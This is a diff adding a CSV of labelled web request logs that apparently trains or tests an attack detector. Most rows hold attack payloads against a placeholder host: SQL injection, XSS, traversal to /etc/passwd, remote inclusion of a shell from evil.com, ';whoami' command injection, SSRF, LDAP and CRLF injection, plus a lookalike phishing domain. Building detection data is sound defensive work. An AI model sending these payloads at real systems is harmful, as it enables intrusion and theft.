@@ -1,0 +1,15 @@
+timestamp,source_ip,method,url,full_url,status_code,user_agent,referrer,scheme,host,path,query_string,file_extension,source,url_length,special_characters,has_sql_keyword,has_script,has_traversal
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/login?id=1 OR 1=1--,http://testphp.vuln/login?id=1 OR 1=1--,,,,http,testphp.vuln,/login,id=1%20OR%201%3D1--,,ipdr,39,12,1,0,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,"http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null,null--","http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null,null--",,,,http,testphp.vuln,/login,id=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2Cnull--,,ipdr,64,22,1,0,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/search?q=<script>alert(1)</script>,http://testphp.vuln/search?q=<script>alert(1)</script>,,,,http,testphp.vuln,/search,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,ipdr,54,14,0,1,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E,http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E,,,,http,testphp.vuln,/search,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,ipdr,54,14,0,1,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/download?file=../../etc/passwd,http://testphp.vuln/download?file=../../etc/passwd,,,,http,testphp.vuln,/download,file=..%2F..%2Fetc%2Fpasswd,,ipdr,50,14,0,0,1
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/index.php?page=../../etc/passwd,http://testphp.vuln/index.php?page=../../etc/passwd,,,,http,testphp.vuln,/index.php,page=..%2F..%2Fetc%2Fpasswd,php,ipdr,51,15,0,0,1
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/index.php?page=http://evil.com/shell.php,http://testphp.vuln/index.php?page=http://evil.com/shell.php,,,,http,testphp.vuln,/index.php,page=http%3A%2F%2Fevil.com%2Fshell.php,php,ipdr,60,14,0,0,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/ping?ip=127.0.0.1;whoami,http://testphp.vuln/ping?ip=127.0.0.1;whoami,,,,http,testphp.vuln,/ping,ip=127.0.0.1%3Bwhoami,,ipdr,44,11,0,0,0
+2026-04-08T15:28:57.155060,0.0.0.0,GET,http://testphp.vuln/fetch?url=http://127.0.0.1/admin,http://testphp.vuln/fetch?url=http://127.0.0.1/admin,,,,http,testphp.vuln,/fetch,url=http%3A%2F%2F127.0.0.1%2Fadmin,,ipdr,52,14,0,0,0
+2026-04-08T15:28:57.156390,0.0.0.0,GET,http://testphp.vuln/login?user=*)(|(user=*)),http://testphp.vuln/login?user=*)(|(user=*)),,,,http,testphp.vuln,/login,user=%2A%29%28%7C%28user%3D%2A%29%29,,ipdr,44,16,0,0,0
+2026-04-08T15:28:57.156390,0.0.0.0,GET,http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true,http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true,,,,http,testphp.vuln,/page,name=abc%0D%0ASet-Cookie%3Aevil%3Dtrue,,ipdr,55,12,0,0,0
+2026-04-08T15:28:57.156390,0.0.0.0,GET,http://arnazon-login.com,http://arnazon-login.com,,,,http,arnazon-login.com,/,,,ipdr,24,5,0,0,0
+2026-04-08T15:28:57.156390,0.0.0.0,GET,http://testphp.vuln/home,http://testphp.vuln/home,,,,http,testphp.vuln,/home,,,ipdr,24,5,0,0,0
+2026-04-08T15:28:57.156390,0.0.0.0,GET,http://testphp.vuln/products?id=10,http://testphp.vuln/products?id=10,,,,http,testphp.vuln,/products,id=10,,ipdr,34,7,0,0,0
